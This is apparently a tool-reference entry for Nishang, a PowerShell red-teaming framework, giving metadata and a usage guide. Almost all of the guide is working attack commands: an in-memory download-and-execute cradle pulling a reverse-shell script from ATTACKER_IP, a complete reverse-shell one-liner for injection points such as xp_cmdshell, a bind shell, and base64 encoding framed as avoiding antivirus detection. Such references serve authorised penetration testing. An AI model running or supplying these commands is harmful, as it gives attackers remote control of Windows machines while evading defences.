---
name: "nishang"
categories:
  - blackarch-windows
version: "0.7.6"
homepage: "https://github.com/samratashok/nishang"
packaged-by: [blackarch, kali]
blackarch-builddate: "2018-11-12"
build-system: windows
license: GPL3
meta-checked: "2026-11-09"
github-repo: "samratashok/nishang"
github-stars: 10182
github-pushed: "2024-04-25"
github-archived: false
github-issues: 22
github-match: "search"
gh-checked: "2026-11-07"
worth: 4.3
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# nishang

> Framework and script collection by Nikhil Mittal that enables PowerShell for offensive security and red teaming.

## What it's for

Nishang is a library of PowerShell scripts and payloads covering all phases of a penetration test: interactive shells, privilege escalation, information gathering, persistence, backdoors and lateral-movement helpers. Every script exports a function with the same name as the file, which is the key to using it: dot-source or download-execute the script, then call that function with parameters. The scripts are heavily flagged by antivirus — the intended delivery is in memory via PowerShell's download-execute cradle or an encoded command, not dropping files to disk. Reach for it when you already have code execution on a Windows target and want a shell or a specific post-exploitation action with one more line.

## Typical use cases

### Catch an interactive reverse shell with Invoke-PowerShellTcp

Serve the script over HTTP from your box and execute it in memory on the target.

```
powershell iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444
```

Outcome: the target downloads the script in memory, executes it, and connects an interactive PowerShell session back to a plain `nc -lvnp 4444` listener on ATTACKER_IP. If you cannot append the function call separately, add the line `Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444` to the end of the served file instead.

### Get a shell from a non-interactive injection point

Use the stripped one-liner from Invoke-PowerShellTcpOneLine where only a single command fits (for example SQL injection into `xp_cmdshell`).

```
powershell -c "$c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"
```

Outcome: a minimal reverse PowerShell connects to your listener without any file transfer — copy it straight from Shells/Invoke-PowerShellTcpOneLine.ps1, change the host and port, and run it from any context that can spawn a process.

### Bind a shell on the target instead

When the target cannot egress, listen locally on the box and connect in.

```
Invoke-PowerShellTcp -Bind -Port 4444
```

Outcome: the script listens on port 4444 on the target; connect with `nc 198.51.100.10 4444` from your machine to get the interactive PowerShell.

### Load the whole framework for interactive use

Import every script at once during a hands-on session.

```
Import-Module .\nishang.psm1
```

Outcome: all scripts load as functions in the current PowerShell session (v3+); individual scripts can alternatively be dot-sourced (`. .\Gather\Get-Information.ps1`) and explored with `Get-Help <script-name> -Full`.

### Deliver a script as an encoded command

Encode a script plus its function call for `powershell -e` delivery from a non-PowerShell shell.

```
Invoke-Encode -DataToEncode C:\nishang\Shells\Invoke-PowerShellTcp.ps1 -OutCommand
```

Outcome: writes the encoded script and command line to encoded.txt; run the emitted base64 string via `powershell -e <encoded>` so nothing touches disk.

*Corpus evidence: genuine usage mined from the corpus (Invoke-PowerShellTcp download-execute cradles and served nishang shells); commands verified against the upstream README and scripts.*
